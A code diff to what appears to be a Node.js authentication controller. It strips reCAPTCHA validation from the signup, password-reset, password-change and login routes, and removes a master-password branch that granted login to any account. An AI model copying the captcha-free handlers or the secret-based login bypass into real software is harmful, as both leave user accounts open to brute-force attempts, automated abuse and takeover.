@@ -66,25 +66,10 @@ module.exports.signup = (req, res) => {
         send({'err': 'You must agree on terms'});
   }
 
-  recaptcha.validate(req.body.captcha).then((success) => {
-    if (!success) {
-      return res.status(httpStatus.BAD_REQUEST).
-          send({'err': 'Invalid captcha value'});
-    }
+  email = String(email).toLocaleLowerCase();
 
-    email = String(email).toLocaleLowerCase();
-
-    return UsersModel.findOne({_id: referralCode}).
-        exec().
-        then((referralUser) => {
-          if (!referralUser && referralCode) {
-            return res.status(httpStatus.BAD_REQUEST).
-                send({'err': 'Referral code not found'});
-          }
-
-          return Promise.all([
-            UsersModel.findOne({email: email}).exec(),
-          ]).spread((user) => {
+    
+            UsersModel.findOne({email: email}).exec().then((user) => {
             if (user) {
               return res.status(httpStatus.BAD_REQUEST).
                   send(
@@ -109,14 +94,11 @@ module.exports.signup = (req, res) => {
             }).save().then(() => {
               return res.send({msg: 'Successfully registered'});
             });
-          });
-        }).
-        catch((err) => {
+          }).catch((err) => {
           logger.error(loggerName, methodName, err);
           return res.status(httpStatus.BAD_REQUEST).
               send({'err': 'Bad request'});
         });
-  });
 };
 
 /**
@@ -250,38 +232,32 @@ module.exports.forgotPassword = (req, res) => {
         send({'err': 'Invalid email address'});
   }
 
-  recaptcha.validate(req.body.captcha).then((success) => {
-    if (!success) {
-      return res.status(httpStatus.BAD_REQUEST).
-          send({'err': 'Invalid captcha value'});
-    }
 
-    logger.debug(loggerName, methodName, email);
+  logger.debug(loggerName, methodName, email);
 
-    const updateQuery = {
-      activationCode: randomstring.generate({length: 64}),
-    };
+  const updateQuery = {
+    activationCode: randomstring.generate({length: 64}),
+  };
 
-    UsersModel.findOneAndUpdate({email: email}, updateQuery, {new: true}).
-        exec().
-        then((user) => {
-          if (!user) {
-            return res.status(httpStatus.BAD_REQUEST).
-                send({'err': 'User not found'});
-          }
+  UsersModel.findOneAndUpdate({email: email}, updateQuery, {new: true}).
+      exec().
+      then((user) => {
+        if (!user) {
+          return res.status(httpStatus.BAD_REQUEST).
+              send({'err': 'User not found'});
+        }
 
-          return NotificationsModel({
-            userId: user._id,
-            message: 'Forgot password executed',
-            type: 'alert',
-            status: 'pending',
-            color: 'warning',
-          }).save().then(() => {
-            return res.send(
-                {msg: 'Password reset instructions has been sent to your email address'});
-          });
+        return NotificationsModel({
+          userId: user._id,
+          message: 'Forgot password executed',
+          type: 'alert',
+          status: 'pending',
+          color: 'warning',
+        }).save().then(() => {
+          return res.send(
+              {msg: 'Password reset instructions has been sent to your email address'});
         });
-  });
+      });
 };
 
 module.exports.verifyActivationCode = (req, res) => {
@@ -363,13 +339,7 @@ module.exports.changePassword = (req, res) => {
     authCount: 0,
   };
 
-  recaptcha.validate(req.body.captcha).then((success) => {
-    if (!success) {
-      return res.status(httpStatus.BAD_REQUEST).
-          send({'err': 'Invalid captcha value'});
-    }
-
-    return UsersModel.findOneAndUpdate({
+  return UsersModel.findOneAndUpdate({
       email: email,
       activationCode: activationCode,
     }, updateQuery, {new: true}).exec().then((user) => {
@@ -389,7 +359,6 @@ module.exports.changePassword = (req, res) => {
             {msg: 'Password has been succesfully changed'});
       });
     });
-  });
 };
 
 module.exports.resendActivateEmail = (req, res) => {
@@ -440,24 +409,14 @@ module.exports.auth = (req, res) => {
         send({'err': 'Invalid passsword'});
   }
 
-  recaptcha.validate(req.body.captcha).then((success) => {
-    if (!success) {
-      return res.status(httpStatus.BAD_REQUEST).
-          send({'err': 'Invalid captcha value'});
-    }
-
-    email = String(email).toLowerCase();
+  email = String(email).toLowerCase();
 
     const authPromises = [];
-
-    if (password === String(config.get('secret'))) {
-      authPromises.push(UsersModel.findOne({email: email}).exec());
-    } else {
-      password = sha512(password);
-      authPromises.push(
-          UsersModel.findOne({email: email, password: password, active: true}).
-              exec());
-    }
+    password = sha512(password);
+    authPromises.push(
+        UsersModel.findOne({email: email, password: password, active: true}).
+            exec());
+  
 
     Promise.all(authPromises).spread((user) => {
       if (!user) {
@@ -543,7 +502,6 @@ module.exports.auth = (req, res) => {
         });
       }
     });
-  });
 };
 
 /**
